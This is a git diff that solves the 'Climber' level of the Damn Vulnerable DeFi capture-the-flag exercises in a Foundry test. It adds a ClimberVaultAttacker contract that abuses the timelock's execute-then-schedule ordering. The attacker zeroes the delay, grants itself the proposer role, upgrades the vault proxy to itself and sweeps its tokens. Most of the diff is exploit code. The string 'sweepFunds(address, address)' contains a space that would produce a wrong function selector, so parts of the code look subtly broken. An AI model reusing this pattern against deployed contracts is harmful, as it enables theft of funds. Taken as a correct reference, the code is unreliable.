@@ -8,6 +8,12 @@ import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../
 import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 
+import {Initializable} from "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
+import {OwnableUpgradeable} from "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
+import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
+import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";
+
 contract ClimberChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -85,7 +91,15 @@ contract ClimberChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_climber() public checkSolvedByPlayer {
-        
+
+        uint256[] memory values = new uint256[](4);
+        values[0] = 0;
+        values[1] = 0;
+        values[2] = 0;
+        values[3] = 0;
+
+        ClimberVaultAttacker attacker = new ClimberVaultAttacker(recovery, timelock, vault, address(token), values);
+        attacker.execute();
     }
 
     /**
@@ -95,4 +109,74 @@ contract ClimberChallenge is Test {
         assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
         assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
     }
+}
+
+contract ClimberVaultAttacker is UUPSUpgradeable {
+    uint256 private _lastWithdrawalTimestamp;
+    address private _sweeper;
+
+    bytes[] private functionCalls = new bytes[](4);
+    address[] private targets = new address[](4);
+    uint256[] private values;
+    ClimberTimelock timelock;
+    DamnValuableToken token;
+    ClimberVault vault;
+
+    constructor(address recovery, ClimberTimelock _timelock, ClimberVault _vault, address _token, uint256[] memory _values) {
+        values = _values;
+        token = DamnValuableToken(_token);
+        timelock = _timelock;
+        vault = _vault;
+
+        targets[0] = address(_timelock);
+        targets[1] = address(_timelock);
+        targets[2] = address(vault);
+        targets[3] = address(this);
+
+        // 1. function call to updateDelay on timelock contract
+        functionCalls[0] = abi.encodeWithSelector(
+            timelock.updateDelay.selector,
+            uint64(0)
+        );
+
+        // 2. function call to grant itself proposer role on timelock contract
+        functionCalls[1] = abi.encodeWithSelector(
+            timelock.grantRole.selector,
+            PROPOSER_ROLE,
+            address(this)
+        );
+
+        // 3. function call to upgradeToAndCall to change new implementation to attack contract
+        functionCalls[2] = abi.encodeWithSelector(
+            vault.upgradeToAndCall.selector,
+            address(this),
+            abi.encodeWithSignature(
+                "sweepFunds(address, address)",
+                address(token),
+                recovery
+            )
+        );
+
+        functionCalls[3] = abi.encodeWithSignature("schedule()");
+    }
+
+    function execute() external {
+        timelock.execute(targets, values, functionCalls, bytes32(0));
+    }
+
+    function schedule() external {
+        // 4. function call to schedule on timelock contract so that subsequent operation state checks pass
+        timelock.schedule(
+            targets,
+            values,
+            functionCalls,
+            bytes32(0)
+        );
+    }
+
+    function sweepFunds(address dvt, address recovery) external {
+        SafeTransferLib.safeTransfer(dvt, recovery, IERC20(dvt).balanceOf(address(this)));
+    }
+
+    function _authorizeUpgrade(address newImplementation) internal override {}
 }
